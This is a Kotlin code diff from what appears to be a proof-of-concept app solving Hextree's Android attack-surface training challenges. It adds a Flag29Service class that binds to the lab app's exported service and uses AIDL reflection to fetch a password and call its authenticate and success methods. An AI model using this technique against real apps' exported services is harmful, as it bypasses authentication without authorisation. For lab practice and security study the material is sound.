@@ -1,6 +1,7 @@
 package com.vishal2376.hextreepoc
 
 import android.content.ComponentName
+import android.content.Context
 import android.content.ServiceConnection
 import android.os.Bundle
 import android.os.Handler
@@ -90,5 +91,35 @@ object Flag28Service {
 
 		override fun onServiceDisconnected(name: ComponentName?) {}
 
+	}
+}
+
+class Flag29Service(context: Context) {
+	val packageName = "io.hextree.attacksurface"
+	val targetInterface = "$packageName.services.IFlag29Interface"
+
+	val serviceConnection = object : ServiceConnection {
+		override fun onServiceConnected(
+			name: ComponentName?,
+			service: IBinder?,
+		) {
+			val aidlReflection = AidlReflection(
+				context = context,
+				targetPackage = packageName,
+				interfaceClassName = targetInterface,
+				binder = service ?: return
+			)
+
+			// Java call: String init()
+			val password = aidlReflection.call(methodName = "init") as String
+
+			// Java call: void authenticate(String) -> authenticate(password)
+			aidlReflection.call("authenticate", arrayOf(String::class.java), password)
+
+			// Java call: void success()
+			aidlReflection.call(methodName = "success")
+		}
+
+		override fun onServiceDisconnected(name: ComponentName?) {}
 	}
 }
